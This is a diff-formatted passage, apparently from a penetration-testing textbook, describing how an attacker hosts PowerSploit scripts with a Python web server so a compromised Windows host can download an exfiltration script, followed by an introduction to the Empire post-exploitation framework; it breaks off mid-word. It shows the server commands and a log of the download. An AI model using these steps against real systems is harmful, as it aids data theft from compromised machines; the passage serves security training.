@@ -1,0 +1,21 @@
+METHOD / ANSWER:
+When you use PowerSploit, you typically expose the scripts launching a
+web service. Example 6-22 shows WebSploit Labs running Kali Linux
+being used with PowerSploit scripts that are located in /usr/share/windows-
+resources/powersploit. A simple web service is started using the command
+sudo python3 -m http.server 1337 (where 1337 is the port number). The
+compromised system then connects to the attacker's machine (WebSploit
+Labs) on port 1337 and downloads a PowerSploit script for data
+exfiltration.
+Example 6-22 Starting a Web Service to Expose the PowerShell Scripts to
+Compromised Hosts
+$ cd /usr/share/windows-resources/powersploit
+$ sudo python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:133
+192.168.88.71 - "GET /Exfiltration/Exfiltration.psdl
+Another PowerShell-based post-exploitation framework is Empire, which is
+an open-source framework that includes a PowerShell Windows agent and a
+Python Linux agent. Empire implements the ability to run PowerShell
+agents without the need for powershell.exe. It allows you to rapidly deploy
+post-exploitation modules including keyloggers, bind shells, reverse shells,
+Mimikatz, and adaptable communicatio
